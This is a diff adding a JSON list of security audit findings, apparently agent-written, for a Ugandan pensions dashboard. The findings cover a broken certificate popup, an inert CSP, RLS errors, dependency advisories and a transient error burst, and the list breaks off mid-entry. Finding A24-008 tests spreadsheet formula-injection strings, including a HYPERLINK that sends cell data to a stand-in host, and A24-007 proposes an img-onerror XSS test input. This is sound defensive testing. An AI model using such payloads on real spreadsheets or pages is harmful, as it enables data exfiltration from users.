@@ -1,0 +1,249 @@
+[
+ {
+  "id": "A24-001",
+  "title": "Insurance policy certificate can never open \u2014 window.open(..., 'noopener') always returns null",
+  "severity": "critical",
+  "confidence": "confirmed",
+  "category": "broken-feature",
+  "surface": "subscriber dashboard (Policies) + signup activation step",
+  "location": "src/signup/contribution/insurancePolicyCertificate.js:436",
+  "demo_visible": true,
+  "effort": "S",
+  "roles_affected": [
+   "subscriber"
+  ],
+  "evidence": "Per the HTML spec, window.open() returns null when the feature string contains 'noopener'. Code: `const win = window.open('', '_blank', 'noopener,noreferrer'); if (!win) return false;` so openPolicyCertificate() ALWAYS returns false.\n\n$ node docs/audits/2026-08-23/a24-winopen-probe.mjs\nchromium {\"withNoopener\":\"NULL\",\"withoutFeatures\":\"window\",\"sameOriginWrite\":\"OK\",\"popupOrigin\":\"http://localhost:5173\",\"canReadOpenerLocalStorage\":\"yes\"}\nwebkit   {\"withNoopener\":\"NULL\",\"withoutFeatures\":\"window\",\"sameOriginWrite\":\"OK\",\"popupOrigin\":\"http://localhost:5173\",\"canReadOpenerLocalStorage\":\"yes\"}\n\nEnd-to-end repro in the real UI as subscriber s-0001 on /dashboard/policies:\n$ node docs/audits/2026-08-23/a24-cert-e2e.mjs\npage text sample: ... Life cover | UGX 1,000,000 cover | Active | PREMIUM | UGX 24,000 / yr | RENEWS | 24 Feb 2027 | Download certificate | Hospital cash | ... | Download certificate | Funeral cover | ... | Download certificate | ...\ncertificate buttons found: 3\npopups opened: 1\ntoast present: true -> Please allow pop-ups for this site, then try again to open your certificate.\n\nScreenshot: docs/audits/2026-08-23/a24-certificate-broken.png\n\n$ git log -1 -L 436,436:src/signup/contribution/insurancePolicyCertificate.js\n9e585b7 Mon May 25 16:14:00 2026 +0530 [Signup] feat: post-payment activation + real camera + insurance cert download\n\nNo test covers it \u2014 src/signup/contribution/insurancePolicyCertificate.test.js:2 states \"openPolicyCertificate just writes it to a new tab, so we assert the produced markup rather than the window plumbing\", and no e2e spec touches the certificate.",
+  "impact": "A rep demoing insurance \u2014 a headline platform feature \u2014 clicks any of the three \"Download certificate\" buttons on the subscriber Policies page (or the same button at the end of signup) and gets a blank tab plus an error message that blames the browser for a setting that is already correct. The certificate never renders. Deterministic on Chromium and WebKit, every viewport, and broken since the feature shipped on 2026-05-25 (three months).",
+  "suggested_fix": "Drop `noopener` from the feature string \u2014 it is meaningless for an about:blank document you must then write into: `window.open('', '_blank')`. Keep the `if (!win) return false` guard for the genuine pop-up-blocked case. Add an e2e assertion that a second page actually opens. Note the coupling: once fixed, the popup is same-origin with the opener (proved above), so the escaping discipline in A24-007 becomes load-bearing.",
+  "repro": [
+   "cd /Users/shubhang/Desktop/Projects/uganda-dashboard && set -a; . ./.env.local; set +a",
+   "node docs/audits/2026-08-23/a24-cert-e2e.mjs   # signs in as s-0001, opens /dashboard/policies, clicks 'Download certificate'",
+   "Observe: 3 certificate buttons, a blank popup opens, and the toast 'Please allow pop-ups for this site' appears \u2014 the certificate never renders",
+   "node docs/audits/2026-08-23/a24-winopen-probe.mjs   # proves window.open('','_blank','noopener,noreferrer') === null on chromium AND webkit"
+  ],
+  "agent": "A24"
+ },
+ {
+  "id": "A24-002",
+  "title": "CSP is report-only, reports nowhere, and cannot be enforced as written \u2014 58 violations if flipped on",
+  "severity": "medium",
+  "confidence": "confirmed",
+  "category": "security-headers",
+  "surface": "whole app (Vercel edge headers)",
+  "location": "vercel.json:11",
+  "demo_visible": false,
+  "effort": "S",
+  "roles_affected": [
+   "all"
+  ],
+  "evidence": "Three defects in one header. (1) It is Content-Security-Policy-Report-Only, so it blocks nothing. (2) It has NO report-uri and NO report-to directive, so it collects nothing either \u2014 inert in both directions. (3) It contradicts the app's own asset origins: `style-src 'self' 'unsafe-inline'` and `font-src 'self'` while index.html:36-38 loads brand typefaces from fonts.googleapis.com / fonts.gstatic.com, and `script-src 'self'` (no 'unsafe-hashes') forbids the inline onload=\"this.media='all'\" attribute on that same <link>.\n\n$ curl -s -D- -o /dev/null https://uganda-dashboard.vercel.app/\ncontent-security-policy-report-only: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https://*.tile.openstreetmap.org https://*.basemaps.cartocdn.com; connect-src 'self' https://ilkhfnoyxlxwqadebnkp.supabase.co https://uganda-dashboard-api.onrender.com https://*.sentry.io; font-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'; object-src 'none'\n(no report-uri, no report-to)\n\nReplayed that exact policy as an ENFORCING header against the live production site:\n$ node docs/audits/2026-08-23/a24-csp-enforce-probe.mjs\nCSP violations under ENFORCEMENT: 58\n \"style-src-elem <- https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans...\": 1\n \"script-src-attr <- inline\": 1\n \"font-src <- https://fonts.gstatic.com/s/inter/v20/...woff2\": 4   (x7 Inter faces)\n \"font-src <- https://fonts.gstatic.com/s/plusjakartasans/v12/...woff2\": 6  (x8 Jakarta faces)\nbody font-family resolved to: Inter, sans-serif\nScreenshot: docs/audits/2026-08-23/a24-csp-enforced.png",
+  "impact": "The app's only XSS mitigation is decorative. With no XSS sink today the immediate risk is nil, but anyone who flips the header to enforcing to \"turn the CSP on\" strips the brand typography from every page including the public landing page \u2014 a demo-visible regression \u2014 and because no report endpoint exists nobody would have had advance warning.",
+  "suggested_fix": "Add https://fonts.googleapis.com to style-src and https://fonts.gstatic.com to font-src; either move the font <link> off its inline onload (do the media swap from main.jsx) or add 'unsafe-hashes' plus the attribute hash. Add a report-to/report-uri endpoint, watch it for a week, then flip to enforcing. Leave frame-ancestors 'none', base-uri 'self', form-action 'self' and object-src 'none' unchanged \u2014 all four are correct.",
+  "repro": [
+   "curl -s -D- -o /dev/null https://uganda-dashboard.vercel.app/ | grep -i content-security   # note: Report-Only, no report-uri",
+   "node docs/audits/2026-08-23/a24-csp-enforce-probe.mjs   # replays the same policy as enforcing \u2192 58 violations"
+  ],
+  "agent": "A24"
+ },
+ {
+  "id": "A24-003",
+  "title": "anon cannot read branches / distributors / notifications at all \u2014 the RLS policy chain hard-errors instead of returning an empty set",
+  "severity": "low",
+  "confidence": "confirmed",
+  "category": "privilege-surface",
+  "surface": "PostgREST (live DB)",
+  "location": "public.current_distributor_id() \u2014 policies branches_select_distributor, distributors_select_self, notifications_select_distributor",
+  "demo_visible": false,
+  "effort": "S",
+  "roles_affected": [
+   "anon"
+  ],
+  "evidence": "Postgres OR-evaluates ALL permissive SELECT policies. Three tables carry a policy calling current_distributor_id(), and anon has no EXECUTE on it \u2014 while table-level SELECT IS granted to anon, so the evident intent is \"let anon ask, let RLS return nothing\".\n\n$ psql \"$SUPABASE_DB_URL\" -X -q -At -F'|' -c \"SELECT p.proname, pg_get_userbyid(p.proowner), p.prosecdef, coalesce(array_to_string(p.proacl,' '),'<default>') FROM pg_proc p JOIN pg_namespace n ON n.oid=p.pronamespace WHERE n.nspname='public' AND p.proname='current_distributor_id';\"\ncurrent_distributor_id|postgres|f|postgres=X/postgres authenticated=X/postgres service_role=X/postgres\n\n$ psql ... -c \"SELECT 'authenticated', has_function_privilege('authenticated','public.current_distributor_id()','EXECUTE') UNION ALL SELECT 'anon', has_function_privilege('anon','public.current_distributor_id()','EXECUTE') UNION ALL SELECT 'service_role', has_function_privilege('service_role','public.current_distributor_id()','EXECUTE');\"\nauthenticated|t\nanon|f\nservice_role|t\n\n$ psql ... <<'SQL'\nBEGIN; SET LOCAL ROLE authenticated; SET LOCAL \"request.jwt.claims\" = '{\"role\":\"authenticated\",\"app_role\":\"admin\",\"adminId\":\"admin-001\"}';\nSELECT 'admin_count', count(*) FROM notifications; ROLLBACK;\nBEGIN; SET LOCAL ROLE anon; SET LOCAL \"request.jwt.claims\" = '{\"role\":\"anon\"}';\nSELECT 'anon_count', count(*) FROM notifications; ROLLBACK;\nSQL\nadmin_count|10\nERROR:  permission denied for function current_distributor_id\n\nOver PostgREST with only the anon key:\nbranches       500 {\"code\":\"25P02\",...\"current transaction is aborted...\"}\ndistributors   401 {\"code\":\"42501\",...\"permission denied for function current_distributor_id\"}\nnotifications  401 {\"code\":\"42501\",...\"permission denied for function current_distributor_id\"}\ndistricts      200 [{\"id\":\"d-buikwe\"}]\nregions        200 [{\"id\":\"r-central\"}]\n\n$ psql ... \"SELECT DISTINCT p.tablename, has_table_privilege('anon', ('public.'||p.tablename)::regclass,'SELECT') FROM pg_policies p WHERE p.qual LIKE '%current_distributor_id%' OR p.with_check LIKE '%current_distributor_id%';\"\nbranches|t\ndistributors|t\nnotifications|t",
+  "impact": "No user-visible effect today \u2014 I captured every request from an unauthenticated session across six landing routes (/, /subscribers, /about, /contact, /claim, /request-access) and the app makes ZERO Supabase calls while logged out. It is a latent trap: the first logged-out feature that reads branches (a public coverage map, a distributor picker) gets a hard 401/500 instead of an empty list, with an error string that names an internal function.",
+  "suggested_fix": "GRANT EXECUTE ON FUNCTION public.current_distributor_id() TO anon; (it is a claims reader and discloses nothing to a caller with no claims). Alternatively make the three policies short-circuit on app_role before calling it, the way the agent/branch/employer policies already do. Primary owner is A03 (privilege surface) / A02 (RLS matrix) \u2014 raised here because it surfaced through the frontend network capture.",
+  "repro": [
+   "cd /Users/shubhang/Desktop/Projects/uganda-dashboard && set -a; . ./.env.local; set +a",
+   "for t in branches distributors notifications districts regions; do curl -s -o /tmp/t.json -w \"$t %{http_code} \" \"$VITE_SUPABASE_URL/rest/v1/$t?select=id&limit=1\" -H \"apikey: $VITE_SUPABASE_ANON_KEY\"; head -c 130 /tmp/t.json; echo; done",
+   "psql \"$SUPABASE_DB_URL\" -c \"BEGIN; SET LOCAL ROLE anon; SELECT count(*) FROM notifications; ROLLBACK;\"   # ERROR: permission denied for function current_distributor_id"
+  ],
+  "agent": "A24"
+ },
+ {
+  "id": "A24-004",
+  "title": "react-router 7.17.0 carries 5 advisories incl. a high; the fix (7.18.2) is inside the declared semver range",
+  "severity": "low",
+  "confidence": "confirmed",
+  "category": "dependency",
+  "surface": "browser bundle",
+  "location": "package.json (react-router-dom: ^7.15.1) \u2192 installed react-router 7.17.0",
+  "demo_visible": false,
+  "effort": "S",
+  "roles_affected": [
+   "all"
+  ],
+  "evidence": "The only vulnerable package that reaches a browser at all.\n\n$ npm ls react-router --all\nuniversal-pensions-uganda@1.0.0\n\u2514\u2500\u252c react-router-dom@7.17.0\n  \u2514\u2500\u2500 react-router@7.17.0        \u2190 PRODUCTION dependency\n\nAll other high/critical packages are devDependency-only and pruned by `npm prune --omit=dev` in render.yaml's buildCommand: nanoid/postcss \u2190 vite; undici \u2190 @vercel/node + jsdom; brace-expansion \u2190 @vercel/nft + eslint-plugin-jsx-a11y; the vulnerable path-to-regexp@6.1.0 \u2190 @vercel/node (express 5.2.1 uses router@2.2.0 \u2192 path-to-regexp@8.4.2, NOT in range). @vercel/node is a TYPE-ONLY import in all 18 api/ and server/ files (`import type { VercelRequest, VercelResponse }`; zero value imports), so it never executes.\n\nReachability of react-router's 5 advisories in THIS codebase \u2014 all refuted:\n- GHSA-wrjc-x8rr-h8h6 open redirect via backslash in <Link>/useNavigate \u2192 needs a user-controlled navigation target. There is none: every navigate() target is a literal or an internal constant; there is no ?redirect=/?returnTo=/?next= parameter anywhere; the one DB-sourced value is composed server-side with a literal prefix:\n  $ psql ... \"SELECT prosrc FROM pg_proc ... proname='get_admin_attention_rows';\" | grep -in href\n  30:  'href', '/dashboard/agents/' || a.id\n  170: 'href', '/dashboard/subscribers/' || c.subscriber_id\n  197: 'href', '/dashboard/subscribers/' || w.subscriber_id\n  (all others NULL) \u2014 a value that always begins '/dashboard/' cannot express the \\\\host or /\\\\host shape the advisory needs.\n- GHSA-chx6-hx7r-mcp5 route-matching DoS \u2192 server-side routing. $ grep -rn \"createStaticHandler|StaticRouter|renderToString|renderToPipeableStream\" src \u2192 (no output); src/main.jsx:93 uses BrowserRouter (client-only SPA).\n- GHSA-337j-9hxr-rhxg deserializeErrors \u2192 SSR hydration. No SSR.\n- GHSA-h8fp-f39c-q6mh RSCErrorHandler and GHSA-qwww-vcr4-c8h2 RSC CSRF \u2192 RSC mode. No RSC.\n\n$ npm outdated  \u2192  react-router-dom  7.17.0 -> wanted 7.18.2  latest 7.18.2   (advisory range 6.0.0 - 7.18.1)",
+  "impact": "No exploit path exists today, so this is a hygiene finding \u2014 but it guarantees the advisory reappears in every future audit, and its non-reachability rests on the \"no user-controlled navigation target\" invariant, which nothing in the codebase enforces. The fix is free: 7.18.2 satisfies the declared ^7.15.1 range.",
+  "suggested_fix": "Merge Dependabot PR #35 (which already contains it) or run `npm update react-router-dom` \u2192 7.18.2. The same PR also takes vite 6.4.2 \u2192 6.4.3 (closes GHSA-fx2h-pf6j-xcff) and concurrently 9.2.1 \u2192 9.2.4 (closes the shell-quote critical), so one merge clears all three in-range advisories.",
+  "repro": [
+   "cd /Users/shubhang/Desktop/Projects/uganda-dashboard && npm ls react-router --all",
+   "npm outdated | grep react-router-dom   # 7.17.0 -> wanted 7.18.2",
+   "grep -rnE \"<(Link|NavLink)[^>]*to=\\{\" src --include='*.jsx' | grep -v '\\.test\\.'   # every target is an internal constant"
+  ],
+  "agent": "A24"
+ },
+ {
+  "id": "A24-005",
+  "title": "@sentry/react is a devDependency but is statically imported by production runtime code",
+  "severity": "low",
+  "confidence": "confirmed",
+  "category": "dependency",
+  "surface": "build",
+  "location": "package.json devDependencies; src/main.jsx:6, src/components/ErrorBoundary.jsx:20",
+  "demo_visible": false,
+  "effort": "S",
+  "roles_affected": [
+   "all"
+  ],
+  "evidence": "$ python3 -c \"import json; d=json.load(open('package.json')); [print(f'{n} -> {k}  {d[k][n]}') for k in ('dependencies','devDependencies') for n in ('@sentry/react','@sentry/node') if n in d[k]]\"\n@sentry/node    -> dependencies     ^10.57.0\n@sentry/react   -> devDependencies  ^10.57.0\n\n$ grep -rn \"@sentry/react\" src | grep -v test\nsrc/main.jsx:6:import * as Sentry from '@sentry/react';\nsrc/components/ErrorBoundary.jsx:20:      import('@sentry/react').then((Sentry) =>\n\n@sentry/node is correctly a runtime dependency (used by server/index.ts); its browser twin is not. The build survives today only because Vercel installs devDependencies by default AND VITE_SENTRY_DSN is unset (so the static import is tree-shaken away entirely \u2014 0 occurrences of 'sentry' across all 6 production entry chunks). Both crutches are incidental.",
+  "impact": "Any build performed with --omit=dev or NODE_ENV=production npm ci \u2014 exactly the pattern render.yaml already had to work around with NPM_CONFIG_PRODUCTION=false and `npm ci --include=dev` \u2014 fails to resolve @sentry/react and the frontend build breaks. A latent build-time failure, not a runtime one.",
+  "suggested_fix": "Move @sentry/react from devDependencies into dependencies, alongside @sentry/node.",
+  "repro": [
+   "cd /Users/shubhang/Desktop/Projects/uganda-dashboard && grep -n '@sentry/react' package.json   # under devDependencies",
+   "grep -rn '@sentry/react' src | grep -v test   # imported by src/main.jsx and src/components/ErrorBoundary.jsx"
+  ],
+  "agent": "A24"
+ },
+ {
+  "id": "A24-006",
+  "title": "Dependabot backlog: 12 open dependency PRs, oldest 76 days; 39 packages behind including 3 that each close a reported advisory",
+  "severity": "low",
+  "confidence": "confirmed",
+  "category": "supply-chain-process",
+  "surface": "repo / CI",
+  "location": ".github/dependabot.yml (config is correct); GitHub PRs #13-#35",
+  "demo_visible": false,
+  "effort": "M",
+  "roles_affected": [
+   "all"
+  ],
+  "evidence": "The automation works and its output is being ignored.\n\n$ gh pr list --state open --limit 30\n35  build(deps): Bump the npm-minor-and-patch group across 1 directory with 27 updates   2026-08-11\n31  build(deps): Bump actions/setup-node from 4 to 7                                     2026-07-14\n29  build(deps): Bump actions/cache from 4 to 6                                          2026-06-30\n27  chore(deps): Bump actions/checkout from 4 to 7                                       2026-06-23\n23  chore(deps): Bump express-rate-limit from 7.5.1 to 8.5.2                             2026-06-09\n20  chore(deps-dev): Bump @eslint/js from 9.39.4 to 10.0.1                               2026-06-09\n19  chore(deps-dev): Bump eslint from 9.39.4 to 10.4.1                                   2026-06-09\n18  chore(deps): Bump helmet from 7.2.0 to 8.2.0                                         2026-06-09\n17  chore(deps-dev): Bump dotenv-cli from 8.0.0 to 11.0.0                                2026-06-09\n16  chore(deps): Bump bcryptjs and @types/bcryptjs                                        2026-06-09\n15  chore(deps-dev): Bump vite from 6.4.2 to 8.0.16                                      2026-06-09\n13  chore(deps): Bump actions/upload-artifact from 4 to 7                                2026-06-09\n\nTen PRs have been open since 2026-06-09 (76 days as of 2026-08-24).\n\n$ npm outdated --json | (analysis)\nTOTAL outdated: 39, of which 12 are major bumps. Every runtime package is behind even its in-range `wanted` version, including:\n  react-router-dom  7.17.0 -> 7.18.2   (closes the only browser-shipped high)\n  vite              6.4.2  -> 6.4.3    (closes GHSA-fx2h-pf6j-xcff)\n  concurrently      9.2.1  -> 9.2.4    (closes the shell-quote critical)\n  @supabase/supabase-js 2.105.4 -> 2.112.3\n  react / react-dom 19.2.4 -> 19.2.8",
+  "impact": "The audit's entire high/critical list is, in practice, one merge of PR #35 away from being materially shorter. Left alone, each weekly cycle widens the gap and the grouped PR grows harder to review \u2014 it is already 27 updates.",
+  "suggested_fix": "Merge PR #35 first (grouped minor/patch; closes all three in-range advisories in one go), then triage the 12 majors individually. Consider a CI gate that fails on a REACHABLE high rather than on any high, so the signal stays meaningful instead of being permanently red.",
+  "repro": [
+   "cd /Users/shubhang/Desktop/Projects/uganda-dashboard && gh pr list --state open --limit 30",
+   "npm outdated"
+  ],
+  "agent": "A24"
+ },
+ {
+  "id": "A24-007",
+  "title": "The single raw-HTML sink is correctly escaped today \u2014 and it writes into a popup that can read the session token",
+  "severity": "info",
+  "confidence": "confirmed",
+  "category": "xss-hardening",
+  "surface": "subscriber + signup (policy certificate)",
+  "location": "src/signup/contribution/insurancePolicyCertificate.js:37-44, 439",
+  "demo_visible": false,
+  "effort": "S",
+  "roles_affected": [
+   "subscriber"
+  ],
+  "evidence": "It is the ONLY raw-HTML sink in 610 client files:\n$ grep -rn \"dangerouslySetInnerHTML\" src api server public index.html            \u2192 (no output)\n$ grep -rn \"\\.innerHTML\\|outerHTML\\|insertAdjacentHTML\" src api server public   \u2192 (no output)\n$ grep -rnE \"\\beval\\(|new Function\\(\" src api server public                     \u2192 (no output)\n$ grep -rnE \"srcDoc|createContextualFragment|createElement\\(['\\\"]script|document\\.write|javascript:\" src --include='*.js' --include='*.jsx' | grep -v '\\.test\\.'\nsrc/signup/contribution/insurancePolicyCertificate.js:439:  win.document.write(html);\n\nI enumerated all 37 ${...} interpolations in the template and classified every one: constants (INDIGO/INK/SUBTLE), escapeHtml() outputs (product, holder, member, premiumLbl, cadence, beneficiary name/rel), or formatter outputs that structurally cannot echo their input \u2014 formatDate() returns '\u2014' for unparseable input (src/utils/date.js:57) and formatUGX() returns 'UGX 0'/'\u2014' for non-finite input (src/utils/currency.js:41). `share` is Number()-coerced. Line 442 assigns document.title, a text property. No gap.\n\nWhy it still matters \u2014 the destination popup is SAME-ORIGIN with the opener:\n$ node docs/audits/2026-08-23/a24-winopen-probe.mjs\nchromium {..., \"sameOriginWrite\":\"OK\", \"popupOrigin\":\"http://localhost:5173\", \"canReadOpenerLocalStorage\":\"yes\"}\nwebkit   {..., \"sameOriginWrite\":\"OK\", \"popupOrigin\":\"http://localhost:5173\", \"canReadOpenerLocalStorage\":\"yes\"}",
+  "impact": "No defect today. But a single future field interpolated without escapeHtml() is not a cosmetic bug \u2014 it is a direct read of localStorage['upensions_token'] from a same-origin document, with no CSP in force to stop it (A24-002). The escaping is hand-rolled and no test asserts it against hostile input; the existing unit test asserts markup shape only.",
+  "suggested_fix": "Add a unit test that feeds `<img src=x onerror=...>` into every string field of buildPolicyCertificateHtml and asserts the output contains no `<img`, `<script` or `onerror`. That converts a convention into a guarantee before A24-001's fix makes this code path live again.",
+  "repro": [
+   "cd /Users/shubhang/Desktop/Projects/uganda-dashboard && grep -on '\\${[^}]*}' src/signup/contribution/insurancePolicyCertificate.js   # 37 interpolations, all safe",
+   "node docs/audits/2026-08-23/a24-winopen-probe.mjs   # popup is same-origin and can read the opener's localStorage"
+  ],
+  "agent": "A24"
+ },
+ {
+  "id": "A24-008",
+  "title": "xlsx security assessment \u2014 clean (no advisory, integrity-pinned, formula injection on write NOT reachable), with one bounded main-thread DoS caveat",
+  "severity": "info",
+  "confidence": "confirmed",
+  "category": "dependency",
+  "surface": "distributor settlement upload / employer bulk onboard / all xlsx exports",
+  "location": "package.json; src/utils/xlsx.js",
+  "demo_visible": false,
+  "effort": "M",
+  "roles_affected": [
+   "distributor",
+   "employer",
+   "branch",
+   "subscriber"
+  ],
+  "evidence": "The baseline is correct that npm reports NO advisory against xlsx, and I did not invent one.\n\n$ (package-lock.json)\nnode_modules/xlsx { \"version\": \"0.20.3\", \"resolved\": \"https://cdn.sheetjs.com/xlsx-0.20.3/xlsx-0.20.3.tgz\", \"integrity\": \"sha512-oLDq3jw7AcLqKWH2AhCpVTZl8mf6X2YReP+Neh0SJUzV/BdZYjth94tG5toiMB1PPrYtxOCfaoUCkvtuH+3AJA==\" }\n$ node -e \"console.log(require('.../node_modules/xlsx/package.json').version)\"  \u2192 0.20.3\n\n0.20.3 is the maintained SheetJS build, past prototype pollution (CVE-2023-30533, <=0.19.2) and ReDoS (CVE-2024-22363, <=0.20.1). Integrity IS pinned, so a CDN compromise fails the install.\n\nHardening already present in src/utils/xlsx.js: MAX_UPLOAD_BYTES = 5 MB, XLSX.read({ sheetRows: 50_000 }), and an extension + MIME allow-list applied BEFORE the bytes reach the parser.\n\nFormula injection on WRITE is NOT reachable \u2014 tested rather than assumed:\n$ node -e \"const XLSX=require('xlsx'); const ws=XLSX.utils.aoa_to_sheet([['Name'],['=HYPERLINK(\\\"http://evil.example/?x=\\\"&A1,\\\"Click\\\")'],['+1+1'],['@SUM(A1)'],['-2+3']]); for (const a of ['A2','A3','A4','A5']) console.log(a, JSON.stringify(ws[a]));\"\nA2 {\"v\":\"=HYPERLINK(\\\"http://evil.example/?x=\\\"&A1,\\\"Click\\\")\",\"t\":\"s\"}\nA3 {\"v\":\"+1+1\",\"t\":\"s\"}\nA4 {\"v\":\"@SUM(A1)\",\"t\":\"s\"}\nA5 {\"v\":\"-2+3\",\"t\":\"s\"}\naoa_to_sheet emits STRING-typed cells (t:\"s\"), so Excel renders them as text and never re-parses them as formulas.\n\nThe CSV path \u2014 where Excel DOES parse at import time \u2014 is separately defended:\n$ node --input-type=module -e \"import { toCsv } from './src/utils/csv.js'; console.log(JSON.stringify(toCsv([{n:'=HYPERLINK(\\\"http://evil\\\",\\\"c\\\")'},{n:'+1+1'},{n:'@SUM(A1)'},{n:'-2+3'}],[{key:'n',label:'Name'}])));\"\n\"\ufeffName\\r\\n\\\"'=HYPERLINK(\\\"\\\"http://evil\\\"\\\",\\\"\\\"c\\\"\\\")\\\"\\r\\n\\\"'+1+1\\\"\\r\\n\\\"'@SUM(A1)\\\"\\r\\n\\\"'-2+3\\\"\"\nFORMULA_TRIGGERS = /^[=+\\-@\\t\\r]/ in src/utils/csv.js prefixes ' and quote-wraps. Both export paths PASS. The apparent asymmetry between csv.js and xlsx.js looks like a gap and is not one.\n\nBundle: vendor-xlsx (500 kB raw) is NOT in the cold path \u2014 prod index.html references six chunks, none of them xlsx; src/utils/xlsx.js uses `await import('xlsx')` inside each function.",
+  "impact": "No security defect. One residual: parseSheet runs on the MAIN THREAD (no Web Worker), so a 5 MB workbook \u2014 legitimate or crafted \u2014 blocks the tab for the duration of the parse. Both the distributor settlement upload and the employer bulk-onboard use it.",
+  "suggested_fix": "No action required for security. If a rep ever reports a frozen tab on upload, move parseSheet into a Web Worker, and tighten MAX_UPLOAD_BYTES toward the real template size (a few KB) rather than 5 MB.",
+  "repro": [
+   "cd /Users/shubhang/Desktop/Projects/uganda-dashboard && node -e \"const XLSX=require('xlsx'); const ws=XLSX.utils.aoa_to_sheet([['Name'],['=HYPERLINK(\\\"http://x\\\",\\\"c\\\")']]); console.log(JSON.stringify(ws['A2']))\"   # t:\"s\" \u2192 not a formula",
+   "npm audit --json | python3 -c \"import json,sys; print('xlsx' in json.load(sys.stdin)['vulnerabilities'])\"   # False"
+  ],
+  "agent": "A24"
+ },
+ {
+  "id": "A24-009",
+  "title": "Sentry is wired end to end but completely inert in production \u2014 the SDK is not even in the bundle",
+  "severity": "info",
+  "confidence": "confirmed",
+  "category": "observability",
+  "surface": "whole app",
+  "location": "src/main.jsx:29-38; vercel.json:11 (connect-src https://*.sentry.io)",
+  "demo_visible": false,
+  "effort": "S",
+  "roles_affected": [
+   "all"
+  ],
+  "evidence": "VITE_SENTRY_DSN is unset in the Vercel build, so Sentry.init never runs \u2014 and Vite's static replacement turns the whole guard into dead code, which Rollup then uses to drop the import entirely.\n\n$ for f in prod*.js; do printf \"%-36s sentry=%s captureException=%s browserTracing=%s\\n\" \"$f\" \"$(grep -oic sentry \"$f\")\" \"$(grep -oc captureException \"$f\")\" \"$(grep -oc 'browserTracing\\|BrowserClient' \"$f\")\"; done\nprodindex-IM_IiCjH.js                sentry=0 captureException=0 browserTracing=0\nprodvendor-CRnas3xB.js               sentry=0 captureException=0 browserTracing=0\nprodvendor-motion-B1udY_rf.js        sentry=0 captureException=0 browserTracing=0\nprodvendor-react-DWMwQj0t.js         sentry=0 captureException=0 browserTracing=0\nprodvendor-router-BuR1e31r.js        sentry=0 captureException=0 browserTracing=0\nprodvendor-tanstack-DbIRYLpQ.js      sentry=0 captureException=0 browserTracing=0\n\nAnd zero Sentry requests in all three captured sessions (anon landing, authenticated subscriber, authenticated distributor+map) \u2014 docs/audits/2026-08-23/a24-thirdparty.json.",
+  "impact": "Not a defect for a demo tool, but three things are quietly untrue: (a) the careful PII scrubber in src/utils/sentryScrub.js has never run in production; (b) ErrorBoundary's Sentry forwarding is a no-op, so the only record of a frontend crash is console.error; (c) the CSP allow-lists https://*.sentry.io in connect-src for traffic that does not exist. \"We have error reporting\" is not currently true.",
+  "suggested_fix": "Either set VITE_SENTRY_DSN in the Vercel project (the scrubber and beforeSend wiring are already correct and sendDefaultPii is explicitly false), or drop https://*.sentry.io from the CSP connect-src and note in the runbook that frontend errors are console-only.",
+  "repro": [
+   "curl -s https://uganda-dashboard.vercel.app/ | grep -o '/assets/[A-Za-z0-9_.-]*\\.js' | sort -u",
+   "for f in <those chunks>; do curl -s https://uganda-dashboard.vercel.app$f | grep -oic sentry; done   # 0 for every chunk"
+  ],
+  "agent": "A24"
+ },
+ {
+  "id": "A24-010",
+  "title": "Transient PostgREST 25P02 500s observed mid-audit \u2014 hypothesis actively REFUTED, not a product defect",
+  "severity": "info",
+  "confidence": "confirmed",
+  "category": "audit-hygiene",
+  "surface": "live PostgREST (project ilkhfnoyxlxwqadebnkp)",
+  "location": "live PostgREST connection pool",
+  "demo_visible": false,
+  "effort": "S",
+  "roles_affected": [
+   "all"
+  ],
+  "evidence": "During my first captures (approx. 08:05-08:15 UTC) the live PostgREST returned {\"code\":\"25P02\",\"message\":\"current transaction is aborted, commands ignored until end of transaction block\"} on 8-30% of AUTHENTICATED reads across unrelated tables, hitting real UI surfaces \u2014 the admin notification bell (HEAD /rest/v1/notifications 500) and the subscriber dashboard's single data call (GET /rest/v1/subscribers?select=*,subscriber_balances(*),... 500).\n\nI chased the obvious hypothesis (that an anon read tripping A24-003's 42501 poisons pooled connections) and DISPROVED it under controlled conditions:\nSTEP 0 clean baseline (40 authenticated reads): 500s = 0\nSTEP 1 fire ONE anon SELECT on public.branches:  -> HTTP 401 {\"code\":\"42501\",...}\nSTEP 2 immediately: 40 authenticated reads: 500s = 0\nSTEP 3 fire 10 more anon SELECTs on public.branches\nSTEP 4 immediately: 40 authenticated reads: 500s = 0\n\nA later clean sweep across roles and tables was fully green:\nanon    /districts   : non-200 = 0 / 40\nadmin   /districts   : non-200 = 0 / 40\nadmin   /subscribers : non-200 = 0 / 40\nservice /districts   : non-200 = 0 / 40\n\nAnd six consecutive reloads of the subscriber dashboard:\n$ node docs/audits/2026-08-23/a24-recheck-subscriber.mjs\nload 1..6: supabase reqs=4 statuses=[200,200,200,200]  (one load made 0 calls, cached)\nclean loads=6 loads-with-500=0",
+  "impact": "None. The burst correlates with the audit's own concurrent load \u2014 27 agents hammering one free-tier project \u2014 and cleared on its own. Recorded here so downstream agents who catch a 25P02 re-measure after a cool-down instead of writing it up as a product defect.",
+  "suggested_fix": "No action. If 25P02 500s reappear outside an audit window (i.e. during a real demo), THEN investigate \u2014 the signature would be a genuinely aborted transaction inside a PostgREST request, and the first thing to check is whether any policy chain raises rather than filters (see A24-003).",
+  "repro": [
+   "cd /Users/shubhang/Desktop/Projects/uganda-dashboard && node docs/audits/2026-08-23/a24-recheck-subscriber.mjs   # currently 6/6 clean loads"
+  ],
+  "agent": "A24"
+ },
+ {
+  "id": "A24-011",
+  "title": "xlsx resolves from cdn.sheetjs.com, not the npm registry \u2014 every build depends on that CDN being reachable",
+  "severity": "low",
+  "confidence": "confirmed",
+  "category": "supply-chain",
+  "surface": "build / CI / deploy",
+  "location": "package.json (\"xlsx\": \"https://cdn.sheetjs.com/xlsx-0.20.3/xlsx-0.20.3.tgz\")",
+  "demo_visible": false,
+  "effort": "S",
+  "roles_affected": [
+   "all"
+  ],
